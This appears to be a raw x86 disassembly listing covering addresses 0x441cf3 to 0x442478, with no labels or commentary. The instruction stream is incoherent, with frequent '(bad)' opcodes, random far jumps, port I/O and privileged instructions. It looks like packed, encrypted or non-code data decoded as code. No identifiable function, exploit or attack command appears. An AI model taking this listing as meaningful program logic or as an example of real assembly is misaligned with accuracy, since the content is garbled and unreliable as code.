  441cf3:	ins    DWORD PTR es:[edi],dx
  441cf4:	or     DWORD PTR [eax],esi
  441cf6:	push   esi
  441cf7:	mov    al,0x3b
  441cf9:	mov    ah,0xee
  441cfb:	lds    ecx,FWORD PTR [ebx]
  441cfd:	bound  edx,QWORD PTR [esi]
  441cff:	xor    BYTE PTR [ecx+ecx*4+0x1d2814ee],dh
  441d06:	ret    0xb995
  441d09:	sub    ecx,DWORD PTR [eax]
  441d0b:	stos   DWORD PTR es:[edi],eax
  441d0c:	ret    0x6c9a
  441d0f:	xor    edx,ebp
  441d11:	xor    BYTE PTR [esi-0x69],ah
  441d14:	push   ds
  441d15:	jmp    0x8d4d:0x94338baa
  441d1c:	add    ch,BYTE PTR [ecx-0x14]
  441d1f:	stos   DWORD PTR es:[edi],eax
  441d20:	or     BYTE PTR [edx+0x6fcd60ae],cl
  441d26:	push   ecx
  441d27:	(bad)  
  441d28:	popa   
  441d29:	sahf   
  441d2a:	push   0xfff29961
  441d2f:	lds    esp,FWORD PTR [ebx]
  441d31:	sub    esi,0x6
  441d34:	pop    es
  441d35:	xchg   BYTE PTR [esi-0x42],dl
  441d38:	and    al,BYTE PTR [eax-0x3d]
  441d3b:	mov    ds:0xab51282f,eax
  441d40:	test   al,0xc
  441d42:	xchg   BYTE PTR [eax+0x5feef7f9],al
  441d48:	jo     0x441d49
  441d4a:	mov    eax,0x5f4f4236
  441d4f:	js     0x441dc3
  441d51:	mov    edx,0x52826eb6
  441d56:	ja     0x441d4c
  441d58:	adc    BYTE PTR [esi+ecx*4],al
  441d5b:	sub    BYTE PTR [edi],bh
  441d5d:	stos   DWORD PTR es:[edi],eax
  441d5e:	stos   BYTE PTR es:[edi],al
  441d5f:	fistp  DWORD PTR [esi-0x67]
  441d62:	push   esp
  441d63:	data16 mov bh,0x80
  441d66:	adc    ebp,DWORD PTR [ebp-0x6]
  441d69:	dec    ecx
  441d6a:	jge    0x441d1a
  441d6c:	dec    edx
  441d6d:	inc    ebp
  441d6e:	or     BYTE PTR [ecx],ah
  441d70:	adc    ah,ch
  441d72:	loope  0x441dd8
  441d74:	fmul   DWORD PTR [esi+ebp*8+0x44384e99]
  441d7b:	dec    edx
  441d7c:	dec    edi
  441d7d:	es and al,0xa1
  441d80:	std    
  441d81:	imul   ecx,DWORD PTR [edx-0x3c],0x37260fe7
  441d88:	pop    esi
  441d89:	arpl   WORD PTR [edi],si
  441d8b:	add    eax,0xb3be50d6
  441d90:	imul   eax,DWORD PTR [eax],0x60bee538
  441d96:	pusha  
  441d97:	sub    eax,0x629f7da8
  441d9c:	inc    esi
  441d9d:	mov    eax,ds:0xee8217ec
  441da2:	xchg   edi,eax
  441da3:	add    ah,BYTE PTR [ebx-0x62]
  441da6:	mov    dh,0x68
  441da8:	mov    ch,0xf9
  441daa:	iret   
  441dab:	hlt    
  441dac:	mov    esp,DWORD PTR [ebx+0x4c]
  441daf:	xchg   esp,eax
  441db0:	fidivr WORD PTR [esi+eax*4-0x4c16a2eb]
  441db7:	aad    0x5e
  441db9:	push   ds
  441dba:	add    al,0xa5
  441dbc:	test   al,0xd6
  441dbe:	js     0x441db2
  441dc0:	push   cs
  441dc1:	popa   
  441dc2:	sahf   
  441dc3:	popa   
  441dc4:	nop
  441dc5:	inc    ebp
  441dc6:	dec    esi
  441dc7:	jp     0x441e0f
  441dc9:	add    bh,ch
  441dcb:	jae    0x441dd1
  441dcd:	aaa    
  441dce:	push   ds
  441dcf:	or     ebx,ecx
  441dd1:	sbb    al,0xae
  441dd3:	mov    al,ds:0x44adf3a4
  441dd8:	cmp    BYTE PTR [ecx],0x5d
  441ddb:	jmp    0x1798:0xec075e5e
  441de2:	(bad)  
  441de3:	mov    ch,0x6f
  441de5:	pusha  
  441de6:	adc    al,0x68
  441de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441de9:	retf   0xb635
  441dec:	lea    ecx,ds:0x435f1e58
  441df2:	xchg   edx,eax
  441df3:	adc    eax,0x6a038d50
  441df8:	daa    
  441df9:	pop    ecx
  441dfa:	cmp    cl,BYTE PTR [ebx+0x75]
  441dfd:	pusha  
  441dfe:	inc    ebp
  441dff:	jmp    DWORD PTR cs:[edx]
  441e02:	sbb    ah,cl
  441e04:	jmp    0xca554076
  441e09:	loopne 0x441e3a
  441e0b:	fdivr  st,st(0)
  441e0d:	in     al,0x2b
  441e0f:	jg     0x441e8c
  441e11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441e12:	sub    BYTE PTR [ecx-0x46d560a8],ah
  441e18:	inc    ecx
  441e19:	fisttp QWORD PTR [esi]
  441e1b:	lods   al,BYTE PTR ds:[esi]
  441e1c:	pop    esi
  441e1d:	inc    esi
  441e1e:	mov    ch,0x48
  441e20:	inc    ebx
  441e21:	xlat   BYTE PTR ds:[ebx]
  441e22:	ins    BYTE PTR es:[edi],dx
  441e23:	jo     0x441e2b
  441e25:	popa   
  441e26:	mov    ebx,0x4dd7e16b
  441e2b:	in     al,0x52
  441e2d:	punpcklbw mm5,DWORD PTR [ebx]
  441e30:	mov    ah,dl
  441e32:	out    dx,al
  441e33:	xchg   BYTE PTR [ecx+0x50],bh
  441e36:	shr    BYTE PTR [ebp+0x0],cl
  441e39:	test   al,0xb9
  441e3b:	mov    al,ds:0xe4f3a644
  441e40:	adc    al,0x44
  441e42:	scas   eax,DWORD PTR es:[edi]
  441e43:	pop    si
  441e45:	out    dx,al
  441e46:	sub    edx,DWORD PTR [edx+eax*1-0x237128e8]
  441e4d:	pusha  
  441e4e:	in     al,0xed
  441e50:	inc    ebp
  441e51:	out    0x3b,al
  441e53:	das    
  441e54:	adc    al,0xf4
  441e56:	fcomp  DWORD PTR [ecx+0x12039159]
  441e5c:	xchg   edx,eax
  441e5d:	lods   al,BYTE PTR ds:[esi]
  441e5e:	lock cmp esi,esp
  441e61:	sub    DWORD PTR [esi+0x35a4bfcc],0xffffffd1
  441e68:	push   esp
  441e69:	popa   
  441e6a:	pop    esp
  441e6b:	aaa    
  441e6c:	sub    cl,bl
  441e6e:	jno    0x441e7d
  441e70:	mov    WORD PTR [ebx-0x7fc75913],gs
  441e76:	lods   eax,DWORD PTR ds:[esi]
  441e77:	jae    0x441e28
  441e79:	aam    0x42
  441e7b:	in     al,dx
  441e7c:	and    al,0x61
  441e7e:	cmp    edx,DWORD PTR [eax+0x48]
  441e81:	mov    ch,0xfa
  441e83:	aaa    
  441e84:	and    ecx,DWORD PTR [edx]
  441e86:	pop    esp
  441e87:	lock jmp 0xc26a0cac
  441e8d:	scas   al,BYTE PTR es:[edi]
  441e8e:	add    eax,DWORD PTR [ebx-0x5f166c71]
  441e94:	mov    al,ds:0xc87aeb80
  441e99:	mov    edx,0x8a316679
  441e9e:	add    DWORD PTR [edi-0x230b5eb1],esp
  441ea4:	push   edx
  441ea5:	and    ebx,DWORD PTR [ebx+0x29]
  441ea8:	clc    
  441ea9:	pop    ebx
  441eaa:	mov    edx,0x382209e0
  441eaf:	and    DWORD PTR [ebx+0x65f6e2db],edi
  441eb5:	lock push eax
  441eb7:	jne    0x441ea7
  441eb9:	loopne 0x441eb3
  441ebb:	xchg   ecx,eax
  441ebc:	(bad)  
  441ebe:	popa   
  441ebf:	popa   
  441ec0:	xor    al,0x68
  441ec2:	dec    ebx
  441ec3:	clc    
  441ec4:	div    BYTE PTR [esi]
  441ec6:	in     eax,dx
  441ec7:	pushf  
  441ec8:	and    DWORD PTR [ecx-0x42],0xa
  441ecc:	fcom   QWORD PTR [esi+eax*2]
  441ecf:	mov    ah,0x9d
  441ed1:	pusha  
  441ed2:	add    BYTE PTR [edx-0x10],bh
  441ed5:	mov    DWORD PTR [esi],0xeef23a6f
  441edb:	ror    DWORD PTR ss:[eax],1
  441ede:	cmp    ch,ch
  441ee0:	cmp    al,0x2a
  441ee2:	mov    ?,WORD PTR cs:[ecx+edi*4-0x6492df4f]
  441eea:	imul   esp,ecx,0xffffff9d
  441eed:	adc    eax,0xef036eee
  441ef2:	fbld   TBYTE PTR [esi-0x4078c820]
  441ef8:	jl     0x441eda
  441efa:	scas   al,BYTE PTR es:[edi]
  441efb:	mov    al,ds:0xc2bd9934
  441f00:	or     DWORD PTR [esi],0x26762dee
  441f06:	sbb    esp,eax
  441f08:	in     al,dx
  441f09:	lea    eax,[ebp+0x3e474aa3]
  441f0f:	iret   
  441f10:	cmp    bh,0xe1
  441f13:	pusha  
  441f14:	in     al,0x49
  441f16:	xchg   edx,eax
  441f17:	jae    0x441f5f
  441f19:	push   edx
  441f1a:	outs   dx,DWORD PTR ds:[esi]
  441f1b:	pop    esp
  441f1c:	sbb    eax,0xdcf34b5b
  441f21:	sahf   
  441f22:	dec    esi
  441f23:	mov    ebp,0x4bf040b5
  441f28:	dec    edi
  441f29:	loope  0x441ef8
  441f2b:	adc    bl,BYTE PTR [esi-0x78]
  441f2e:	xchg   esp,eax
  441f2f:	jae    0x441ecd
  441f31:	adc    al,0xb
  441f33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441f34:	jbe    0x441f7a
  441f36:	mov    ?,WORD PTR [eax]
  441f38:	sbb    ecx,edi
  441f3a:	push   ds
  441f3b:	mov    eax,ds:0x8f61aa12
  441f40:	cli    
  441f41:	ret    
  441f42:	jl     0x441ee5
  441f44:	add    edi,DWORD PTR [edi+0x6c]
  441f47:	outs   dx,DWORD PTR ds:[esi]
  441f48:	sub    esi,DWORD PTR [edi+0x1d]
  441f4b:	(bad)  
  441f4c:	pop    esi
  441f4d:	push   ecx
  441f4e:	cwde   
  441f4f:	imul   esp,ebx,0xfffffff0
  441f52:	mov    eax,0x3c49a531
  441f57:	inc    ebp
  441f58:	mov    DWORD PTR [eax+0x7],esp
  441f5b:	and    eax,0x9dffaf22
  441f60:	out    dx,al
  441f61:	dec    esp
  441f62:	jmp    0x441faa
  441f64:	mov    ebx,?
  441f66:	dec    edi
  441f67:	jp     0x441f8a
  441f69:	mov    eax,ds:0x61151158
  441f6e:	sbb    al,0x76
  441f70:	push   ebp
  441f71:	ja     0x441f1b
  441f73:	(bad)  
  441f74:	xchg   esi,eax
  441f75:	pop    ecx
  441f76:	fs ss pop esi
  441f79:	dec    esp
  441f7a:	into   
  441f7b:	xchg   esi,eax
  441f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441f7d:	mov    cl,0xef
  441f7f:	push   cs
  441f80:	(bad)  
  441f81:	pop    ebp
  441f82:	jo     0x441fab
  441f84:	add    al,0xfb
  441f86:	dec    esi
  441f87:	fnstsw WORD PTR [ebx-0x5136340]
  441f8d:	aaa    
  441f8e:	dec    esp
  441f8f:	jp     0x441fef
  441f91:	fimul  WORD PTR [edx-0x50]
  441f94:	cld    
  441f95:	add    ah,BYTE PTR [eax-0xe]
  441f98:	inc    ecx
  441f99:	popa   
  441f9a:	jo     0x441fa2
  441f9c:	adc    ah,BYTE PTR [ebp+0x5dfd521d]
  441fa2:	in     eax,dx
  441fa3:	sub    ah,BYTE PTR [edi]
  441fa5:	xor    ebx,eax
  441fa7:	(bad)  
  441fa8:	ror    DWORD PTR [edi+0x3e],1
  441fab:	sbb    edi,eax
  441fad:	pusha  
  441fae:	xor    dl,ah
  441fb0:	pushf  
  441fb1:	pop    ecx
  441fb2:	loopne 0x441f9e
  441fb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441fb5:	(bad)
  441fb8:	inc    DWORD PTR [edi+0xe]
  441fbb:	adc    bl,BYTE PTR [ebx]
  441fbd:	xchg   BYTE PTR [eax-0xf1c7a5d],bh
  441fc3:	imul   ecx,DWORD PTR [edx+0x507f3603],0x7394e717
  441fcd:	push   0x2c
  441fcf:	sar    BYTE PTR [esi+0x4b],cl
  441fd2:	mov    edx,0x255202f8
  441fd7:	push   esi
  441fd8:	cdq    
  441fd9:	leave  
  441fda:	mul    DWORD PTR [eax-0x4748a619]
  441fe0:	push   ecx
  441fe1:	ss jmp 0x9e32:0xbe041f01
  441fe9:	push   0x51
  441feb:	xor    cl,dl
  441fed:	mov    dl,0xbd
  441fef:	mov    al,ds:0xdfce0685
  441ff4:	imul   ebp,ebp,0xd45efdc1
  441ffa:	ds or  eax,0xb227bbb6
  442000:	aad    0x60
  442002:	dec    esp
  442003:	push   DWORD PTR [edi]
  442005:	sub    al,0xa5
  442007:	cmp    DWORD PTR [esi-0xd6211cf],0x36c862ef
  442011:	test   al,0x36
  442013:	mov    eax,ds:0x3ce6b68f
  442018:	or     DWORD PTR [ecx],0xffffffe3
  44201b:	pop    edi
  44201c:	pop    esi
  44201d:	mov    gs:0xadf741f5,eax
  442023:	lods   eax,DWORD PTR ds:[esi]
  442024:	outs   dx,DWORD PTR ds:[esi]
  442025:	mov    dh,0x7f
  442027:	mov    eax,ds:0xeecc6c62
  44202c:	xor    eax,0x5e603cc0
  442031:	std    
  442032:	jne    0x44205d
  442034:	mov    eax,ds:0xaf3f5edd
  442039:	pusha  
  44203a:	outs   dx,DWORD PTR ds:[esi]
  44203b:	inc    esp
  44203c:	dec    ebx
  44203d:	xor    al,0xe8
  44203f:	mov    edx,0x2feebc3f
  442044:	sbb    BYTE PTR [ebx-0x5c],dl
  442047:	add    cl,dl
  442049:	iret   
  44204a:	jns    0x441fed
  44204c:	dec    esp
  44204d:	das    
  44204e:	push   cs
  44204f:	inc    esi
  442050:	int3   
  442051:	shl    DWORD PTR [ebp-0x3f43a24a],1
  442057:	aad    0xd0
  442059:	xchg   esi,eax
  44205a:	and    BYTE PTR [edx-0x5dc5708e],0x6a
  442061:	jge    0x441ff9
  442063:	nop
  442064:	shl    dl,0x7f
  442067:	pusha  
  442068:	scas   eax,DWORD PTR es:[edi]
  442069:	sub    DWORD PTR [esi-0x129dd6c8],ebx
  44206f:	push   cs
  442070:	xor    al,0x81
  442072:	dec    eax
  442073:	pop    esp
  442074:	pop    eax
  442075:	jnp    0x442045
  442077:	push   es
  442078:	fcomi  st,st(0)
  44207a:	and    esp,DWORD PTR [ecx+0x77d74bfa]
  442080:	in     al,dx
  442081:	repz mov bl,0xb4
  442084:	push   ecx
  442085:	aaa    
  442086:	mov    cs:0x1ed006de,eax
  44208c:	retf   0x9987
  44208f:	sub    DWORD PTR [ebx+0x61],esp
  442092:	xor    ebp,DWORD PTR [esi]
  442094:	adc    al,BYTE PTR [ecx+ebx*8+0x73]
  442098:	mov    ecx,0x389beb7b
  44209d:	inc    edi
  44209e:	stos   BYTE PTR es:[edi],al
  44209f:	adc    al,0xd6
  4420a1:	loopne 0x442101
  4420a3:	sub    dh,al
  4420a5:	sub    BYTE PTR [eax],bl
  4420a7:	jne    0x442128
  4420a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4420aa:	cmp    eax,0xe0ad76a1
  4420af:	pop    ebx
  4420b0:	sbb    al,0x32
  4420b2:	mov    bh,0x9e
  4420b4:	pop    esi
  4420b5:	xlat   BYTE PTR ds:[ebx]
  4420b6:	xchg   edx,eax
  4420b7:	pop    es
  4420b8:	push   ecx
  4420b9:	xchg   ebx,eax
  4420ba:	sti    
  4420bb:	cwde   
  4420bc:	jnp    0x44211e
  4420be:	xchg   BYTE PTR [edi-0x36],cl
  4420c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4420c2:	in     al,0xe
  4420c4:	ins    DWORD PTR es:[edi],dx
  4420c5:	ret    
  4420c6:	out    dx,al
  4420c7:	arpl   WORD PTR [ebx+ecx*4],sp
  4420ca:	das    
  4420cb:	ret    0xf39a
  4420ce:	loope  0x44207a
  4420d0:	cmp    BYTE PTR [esi],dh
  4420d2:	outs   dx,BYTE PTR ds:[esi]
  4420d3:	xchg   bh,ch
  4420d5:	dec    esi
  4420d6:	arpl   bp,cx
  4420d8:	jbe    0x44211c
  4420da:	out    dx,al
  4420db:	push   esp
  4420dc:	(bad)  
  4420de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4420df:	sbb    eax,0xa18c6aee
  4420e4:	jae    0x442156
  4420e6:	mov    bh,0xa2
  4420e8:	adc    eax,0x766a5853
  4420ed:	dec    edx
  4420ee:	out    dx,al
  4420ef:	in     al,dx
  4420f0:	call   0x8ab8:0x279a5b1e
  4420f7:	mov    eax,ds:0x83923d68
  4420fc:	fsubrp st(1),st
  4420fe:	rol    BYTE PTR [esi],1
  442100:	pop    esi
  442101:	inc    edi
  442102:	jp     0x442146
  442104:	mov    esi,0x1385699d
  442109:	popa   
  44210a:	jnp    0x442122
  44210c:	cmp    DWORD PTR ds:0x5ddac73c,edx
  442112:	jecxz  0x4420d3
  442114:	pop    esi
  442115:	iret   
  442116:	jle    0x442102
  442118:	aaa    
  442119:	jae    0x4420a4
  44211b:	cmp    eax,DWORD PTR [edi+0x61]
  44211e:	ds scas al,BYTE PTR es:[di]
  442121:	xor    cl,BYTE PTR [edx+0x566cbb57]
  442127:	mov    ebp,0x86eed1f3
  44212c:	fs lock aad 0x48
  442130:	inc    DWORD PTR [ebx]
  442132:	mov    ch,0xe9
  442134:	out    dx,eax
  442135:	pusha  
  442136:	test   al,0xf8
  442138:	push   eax
  442139:	jne    0x442136
  44213b:	rcl    BYTE PTR [edi],0x43
  44213e:	out    dx,al
  44213f:	(bad)  
  442140:	sbb    BYTE PTR [eax],dl
  442142:	pop    eax
  442143:	jb     0x442142
  442145:	ins    DWORD PTR es:[edi],dx
  442146:	bound  esp,QWORD PTR [ecx+0x753e2301]
  44214c:	pop    esp
  44214d:	fpatan 
  44214f:	jmp    0x4421ab
  442151:	jg     0x4421b1
  442153:	dec    ebp
  442154:	(bad)  
  442155:	iret   
  442156:	mov    ds:0x9ae15e7f,al
  44215b:	cmp    eax,0xa80fe551
  442160:	pop    esi
  442161:	dec    esi
  442162:	ss aaa 
  442164:	inc    esi
  442165:	mov    es,WORD PTR [esi-0x5d]
  442168:	pop    edi
  442169:	push   esi
  44216a:	jl     0x44215a
  44216c:	cdq    
  44216d:	pushf  
  44216e:	out    dx,al
  44216f:	sti    
  442170:	outs   dx,DWORD PTR ds:[esi]
  442171:	and    BYTE PTR [esi-0x72],cl
  442174:	in     eax,dx
  442175:	call   0x882f6461
  44217a:	popa   
  44217b:	sar    BYTE PTR [esi+0x14934aca],0x11
  442182:	not    BYTE PTR [ebp-0x76]
  442185:	pusha  
  442186:	push   eax
  442187:	mov    edi,ebp
  442189:	lds    edi,FWORD PTR [ebp+0x2220e980]
  44218f:	sbb    al,0xf5
  442191:	pop    edi
  442192:	adc    eax,0x82590ec5
  442197:	jp     0x44211a
  442199:	lock sub al,BYTE PTR ds:0xa475262d
  4421a0:	jo     0x4421b3
  4421a2:	cdq    
  4421a3:	jl     0x44216d
  4421a5:	fwait
  4421a6:	dec    ebp
  4421a7:	and    eax,0x84f714d
  4421ac:	pusha  
  4421ad:	mov    WORD PTR [ebx+0x5c020f33],es
  4421b3:	in     al,0x1f
  4421b5:	jmp    0x61654f87
  4421ba:	push   cs
  4421bb:	mov    edx,0x29cac14e
  4421c0:	test   DWORD PTR [esi+ebp*8+0xf],edi
  4421c4:	mov    dl,0x1a
  4421c6:	repz or edi,DWORD PTR [ebx]
  4421c9:	xor    BYTE PTR [ebx],0xa9
  4421cc:	cld    
  4421cd:	jle    0x4421bd
  4421cf:	bound  ebx,QWORD PTR [eax-0xb]
  4421d2:	adc    eax,0xf492f6f1
  4421d7:	mov    esi,0x615c4b14
  4421dc:	pop    esi
  4421dd:	stos   BYTE PTR es:[edi],al
  4421de:	jge    0x4421ae
  4421e0:	xchg   ecx,ebx
  4421e2:	scas   al,BYTE PTR es:[edi]
  4421e3:	mov    al,ds:0x25850d0e
  4421e8:	mov    ecx,edi
  4421ea:	sti    
  4421eb:	pop    edi
  4421ec:	arpl   si,di
  4421ee:	sbb    eax,DWORD PTR [ecx-0x45a45ffe]
  4421f4:	pusha  
  4421f5:	ds data16 mov dl,0x93
  4421f9:	pop    ecx
  4421fa:	repz sbb al,0x82
  4421fd:	sub    BYTE PTR [esi],ah
  4421ff:	loope  0x44221e
  442201:	xor    al,0xf4
  442203:	sbb    eax,0x250a3535
  442208:	cdq    
  442209:	aas    
  44220a:	xchg   DWORD PTR [esi+ebx*4-0x75],esp
  44220e:	repz icebp 
  442210:	xchg   eax,ebp
  442212:	jns    0x442222
  442214:	not    BYTE PTR [eax]
  442216:	dec    esi
  442217:	sahf   
  442218:	pop    esi
  442219:	mov    ebx,0x975319d9
  44221e:	sub    eax,0x8b5e4e33
  442223:	mov    ecx,0xf3aeab8
  442228:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442229:	push   ds
  44222a:	neg    BYTE PTR [edx]
  44222c:	pop    esi
  44222d:	adc    bh,BYTE PTR [ecx-0x33148ef8]
  442233:	xchg   BYTE PTR [eax+0x60],bh
  442236:	lea    esi,[edi-0x7837e214]
  44223c:	loopne 0x4421e8
  44223e:	lock ja 0x442283
  442241:	jmp    0x50e98aca
  442246:	into   
  442247:	cmp    ecx,esp
  442249:	sbb    al,0xea
  44224b:	outs   dx,BYTE PTR ds:[esi]
  44224c:	mov    esp,DWORD PTR [eax-0x1e]
  44224f:	bound  eax,QWORD PTR [ecx+0x27]
  442252:	sub    bl,dl
  442254:	mov    ch,0x2d
  442256:	pop    edx
  442257:	mov    al,0x59
  442259:	in     eax,dx
  44225a:	cmp    DWORD PTR [edi],edi
  44225c:	int3   
  44225d:	lock cs out dx,eax
  442260:	and    al,0x9a
  442262:	stos   DWORD PTR es:[edi],eax
  442263:	(bad)  
  442264:	xlat   BYTE PTR ds:[ebx]
  442265:	bound  ecx,QWORD PTR [ebx]
  442267:	stos   BYTE PTR es:[edi],al
  442268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442269:	(bad)  
  44226a:	out    dx,al
  44226b:	mov    ebp,0xd1c02c7a
  442270:	push   esi
  442271:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442272:	out    dx,al
  442273:	(bad)  
  442274:	jno    0x44223f
  442276:	sub    dh,dl
  442278:	repnz fnsave [esi-0x5e]
  44227c:	push   0x19
  44227e:	stos   DWORD PTR es:[edi],eax
  44227f:	test   al,0x2a
  442281:	adc    ch,al
  442283:	push   esp
  442284:	sbb    eax,0xce300236
  442289:	repnz out dx,al
  44228b:	and    eax,0xcbb0f86d
  442290:	lock pusha 
  442292:	test   eax,0x395ae907
  442297:	push   esp
  442298:	mov    esi,0x13805288
  44229d:	xlat   BYTE PTR ds:[ebx]
  44229e:	xchg   esi,eax
  44229f:	fdiv   QWORD PTR [esi]
  4422a1:	and    ch,BYTE PTR [esi-0x61]
  4422a4:	lea    ebx,[eax+0x3c9bcf3c]
  4422aa:	out    dx,al
  4422ab:	xor    eax,0xe36680cf
  4422b0:	mov    ?,WORD PTR [edx+ebp*8-0x5c]
  4422b4:	and    esi,DWORD PTR [ebx]
  4422b6:	sub    esp,0x6727b728
  4422bc:	std    
  4422bd:	jns    0x442305
  4422bf:	pusha  
  4422c0:	xchg   ecx,eax
  4422c1:	les    edi,FWORD PTR [edx]
  4422c3:	sub    eax,0xc1314c2
  4422c8:	pop    esi
  4422c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4422ca:	mov    esi,0x4acbffb5
  4422cf:	aam    0x5d
  4422d1:	sub    ch,BYTE PTR [eax+0x1039d8ab]
  4422d7:	in     al,dx
  4422d8:	mov    ds:0x5bf26495,al
  4422dd:	pusha  
  4422de:	jae    0x4422b8
  4422e0:	dec    edi
  4422e1:	xchg   ebx,eax
  4422e2:	mov    al,ds:0xce8d5dcd
  4422e7:	lahf   
  4422e8:	pop    esi
  4422e9:	cdq    
  4422ea:	inc    ebp
  4422eb:	mov    eax,DWORD PTR [ebx]
  4422ed:	fisttp DWORD PTR [eax-0x57]
  4422f0:	sub    BYTE PTR [edi],ch
  4422f2:	lahf   
  4422f3:	mov    eax,ds:0x5295d92e
  4422f8:	push   edx
  4422f9:	mov    ds:0x2f5e2b8c,eax
  4422fe:	ins    BYTE PTR es:[edi],dx
  4422ff:	jb     0x442307
  442301:	int3   
  442302:	sbb    DWORD PTR [ecx+0x2f],esp
  442305:	popa   
  442306:	mov    dl,BYTE PTR [ebp-0x46618943]
  44230c:	div    DWORD PTR [ecx+ecx*1+0x1430fcea]
  442313:	scas   al,BYTE PTR es:[edi]
  442314:	daa    
  442315:	adc    al,0x78
  442317:	sub    edi,esi
  442319:	pusha  
  44231a:	push   0xffffffe1
  44231c:	jns    0x44230a
  44231e:	or     eax,0x63085e85
  442323:	test   eax,0x76fdb40a
  442328:	inc    eax
  442329:	mov    bh,0x7
  44232b:	mov    eax,ds:0xd675f1ef
  442330:	mov    ah,0x1d
  442332:	test   DWORD PTR [edi+0x31],0xd620e122
  442339:	xchg   DWORD PTR [edx],eax
  44233b:	retf   0x4303
  44233e:	cmp    eax,0xda1abc9f
  442343:	fadd   QWORD PTR [ebx+0x4a]
  442346:	or     edi,DWORD PTR ds:0xd8a6dd82
  44234c:	add    al,0xd7
  44234e:	repz sub edx,DWORD PTR [edx]
  442351:	loope  0x44238f
  442353:	and    esp,edx
  442355:	sbb    esi,DWORD PTR [edi]
  442357:	je     0x442303
  442359:	pusha  
  44235a:	xor    al,0x79
  44235c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44235d:	stos   BYTE PTR es:[edi],al
  44235e:	ficom  WORD PTR [eax+0x1c]
  442361:	mov    ebp,0xe6c2b5ee
  442366:	cmc    
  442367:	pop    ds
  442368:	push   ss
  442369:	push   edx
  44236a:	push   ebp
  44236b:	mov    eax,ds:0xfb56b58
  442370:	mov    BYTE PTR [ebx],cl
  442372:	aaa    
  442373:	call   0x404fc3d6
  442378:	in     al,dx
  442379:	jp     0x4423a9
  44237b:	repnz and BYTE PTR [eax-0x46],0xc0
  442380:	pop    ecx
  442381:	shl    al,1
  442383:	mov    cl,0x9a
  442385:	ja     0x442386
  442387:	and    al,0x36
  442389:	pop    edx
  44238a:	out    dx,al
  44238b:	repz loop 0x44231b
  44238e:	lahf   
  44238f:	adc    edi,edx
  442391:	data16 jne 0x44240b
  442394:	pop    esi
  442395:	out    0x6e,al
  442397:	pop    edi
  442398:	inc    ecx
  442399:	jmp    0x442367
  44239b:	xlat   BYTE PTR ds:[ebx]
  44239c:	sahf   
  44239d:	sbb    BYTE PTR [eax+eax*4+0x5f],al
  4423a1:	sbb    dh,BYTE PTR [ecx-0x5c]
  4423a4:	pop    esp
  4423a5:	stc    
  4423a6:	jg     0x442347
  4423a8:	fldenv [esi+0x191f748e]
  4423ae:	out    dx,al
  4423af:	dec    edi
  4423b0:	push   edx
  4423b1:	mov    BYTE PTR [ebx],ah
  4423b3:	mov    al,ds:0xa11600dd
  4423b8:	adc    eax,ebx
  4423ba:	inc    ebx
  4423bb:	sub    eax,0x9838f69c
  4423c0:	push   ebx
  4423c1:	(bad)  
  4423c2:	push   ebp
  4423c3:	hlt    
  4423c4:	sahf   
  4423c5:	out    0x71,eax
  4423c7:	cmp    al,0xea
  4423c9:	push   esp
  4423ca:	imul   esp,DWORD PTR [ecx-0x4c9304cf],0x165712ff
  4423d4:	pop    esi
  4423d5:	dec    esp
  4423d6:	in     eax,dx
  4423d7:	push   ecx
  4423d8:	mov    eax,0xae015f68
  4423dd:	mov    cl,0x1d
  4423df:	inc    ebp
  4423e0:	push   ds
  4423e1:	push   esp
  4423e2:	jae    0x4423d6
  4423e4:	xor    DWORD PTR [eax+esi*8+0x72],eax
  4423e8:	iret   
  4423e9:	and    BYTE PTR [ecx+ecx*1+0x6344f6ea],dh
  4423f0:	push   ecx
  4423f1:	xchg   esp,eax
  4423f2:	in     al,0xfa
  4423f4:	push   ds
  4423f5:	nop
  4423f6:	into   
  4423f7:	sbb    BYTE PTR [ecx-0x165efc17],cl
  4423fd:	sbb    BYTE PTR [ebx],bl
  4423ff:	pusha  
  442400:	jle    0x44242a
  442402:	sbb    al,0xb5
  442404:	pop    esi
  442405:	fld    QWORD PTR [esi+esi*4]
  442408:	hlt    
  442409:	jmp    0xebbd:0x6590ace4
  442410:	mov    dl,0x4f
  442412:	out    dx,al
  442413:	mov    dh,0xa9
  442415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442416:	idiv   DWORD PTR [edx]
  442418:	int3   
  442419:	jp     0x442406
  44241b:	(bad)  
  44241c:	lock shl BYTE PTR [ebx],0xde
  442420:	dec    edi
  442421:	icebp  
  442422:	pop    ebp
  442423:	je     0x44245b
  442425:	inc    ebp
  442426:	call   0xd2654d07
  44242b:	sbb    BYTE PTR [ebx+0x5ef01ef8],ah
  442431:	sbb    bl,BYTE PTR [ecx]
  442433:	sbb    dl,BYTE PTR [eax]
  442435:	(bad)  
  442436:	loope  0x442449
  442438:	adc    al,0x61
  44243a:	pop    edx
  44243b:	cli    
  44243c:	fs ja  0x4423c6
  44243f:	pop    ss
  442440:	loopne 0x442404
  442442:	in     eax,0x7e
  442444:	push   ebx
  442445:	out    dx,al
  442446:	(bad)  
  442447:	rcr    BYTE PTR [esi-0x406f7beb],0xce
  44244e:	hlt    
  44244f:	mov    al,ds:0xb4b8eb00
  442454:	or     eax,0x63343847
  442459:	mov    BYTE PTR [esi-0x5d],ah
  44245c:	or     dh,BYTE PTR [edx-0x13e1f1b]
  442462:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442463:	mov    eax,ds:0x4225a0f
  442468:	dec    edx
  442469:	repnz adc DWORD PTR [edi],ebx
  44246c:	pop    ebx
  44246d:	push   edi
  44246e:	aad    0x0
  442470:	mov    bh,BYTE PTR [edx+0x1b]
  442473:	push   edx
  442474:	pop    ebx
  442475:	jo     0x4424e5
  442477:	push   es
  442478:	rcl    BYTE PTR [eax-0x72],0x7
